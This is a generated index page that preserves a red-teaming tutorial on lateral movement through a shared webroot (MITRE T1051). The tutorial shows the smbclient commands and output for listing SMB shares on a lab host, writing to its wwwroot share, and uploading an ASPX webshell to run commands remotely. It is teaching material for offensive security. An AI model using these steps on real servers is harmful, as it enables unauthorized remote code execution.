---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Shared Webroot

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-t1051-shared-webroot` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1051-shared-webroot.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Shared Webroot](../../topics/offensive-security/shared-webroot.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-t1051-shared-webroot |
| name | Shared Webroot |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/t1051-shared-webroot.md |

## Preserved Source Material

````yaml
_asset_filenames:
- webroot-ownage.png
- webroot-rce.png
_body: "---\ndescription: Lateral Movement\n---\n\n# Shared Webroot\n\n## Execution\n\nEnumerating victim host `10.0.0.6`\
  \ for any shares:\n\n{% code title=\"attacker@local\" %}\n```csharp\nsmbclient -L //10.0.0.6 -U spot\n\nWARNING: The \"\
  syslog\" option is deprecated\nEnter WORKGROUP\\spot's password: \n\n\tSharename       Type      Comment\n\t---------  \
  \     ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tCertEnroll\
  \      Disk      Active Directory Certificate Services share\n\tIPC$            IPC       Remote IPC\n\tNETLOGON       \
  \ Disk      Logon server share \n\tSYSVOL          Disk      Logon server share \n\ttemp            Disk      \n\ttools\
  \           Disk      \n\ttranscripts     Disk      \n\twwwroot         Disk      \n```\n{% endcode %}\n\nLogging in to\
  \ the `wwwroot` share:\n\n{% code title=\"attacker@local\" %}\n```csharp\nsmbclient //10.0.0.6/wwwroot -U spot\n\nWARNING:\
  \ The \"syslog\" option is deprecated\nEnter WORKGROUP\\spot's password: \nTry \"help\" to get a list of possible commands.\n\
  smb: \\> ls\n  .                                   D        0  Sat Aug 25 16:57:52 2018\n  ..                          \
  \        D        0  Sat Aug 25 16:57:52 2018\n  aspnet_client                       D        0  Tue Jul 31 20:11:20 2018\n\
  \  iis-85.png                          A    99710  Tue Jul 31 19:35:48 2018\n  iisstart.htm                        A   \
  \     3  Tue Jul 31 19:38:23 2018\n```\n{% endcode %}\n\nUploading a webshell into the `wwwroot`:\n\n```csharp\nput /usr/share/webshells/aspx/cmdasp.aspx\
  \ c.aspx\n\nputting file /usr/share/webshells/aspx/cmdasp.aspx as \\c.aspx (341.8 kb/s) (average 341.8 kb/s)\nsmb: \\> ls\n\
  \  .                                   D        0  Sat Aug 25 16:59:47 2018\n  ..                                  D   \
  \     0  Sat Aug 25 16:59:47 2018\n  aspnet_client                       D        0  Tue Jul 31 20:11:20 2018\n  c.aspx\
  \                              A     1400  Sat Aug 25 16:59:47 2018\n  iis-85.png                          A    99710  Tue\
  \ Jul 31 19:35:48 2018\n  iisstart.htm                        A        3  Tue Jul 31 19:38:23 2018\n\n\t\t6463487 blocks\
  \ of size 4096. 3032260 blocks available\n```\n\nSame as above in a picture:\n\n![](../../.gitbook/assets/webroot-ownage.png)\n\
  \nAttacker can now access the newly uploaded webshell via `http://10.0.0.6/c.aspx` and start executing commands:\n\n![](../../.gitbook/assets/webroot-rce.png)\n\
  \n## Observations\n\nSee T1108: Webshells for observations:\n\n{% page-ref page=\"../privilege-escalation/t1108-redundant-access.md\"\
  \ %}\n\n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1051\" %}"
_relative_path: offensive-security/lateral-movement/t1051-shared-webroot.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1051-shared-webroot.md
````
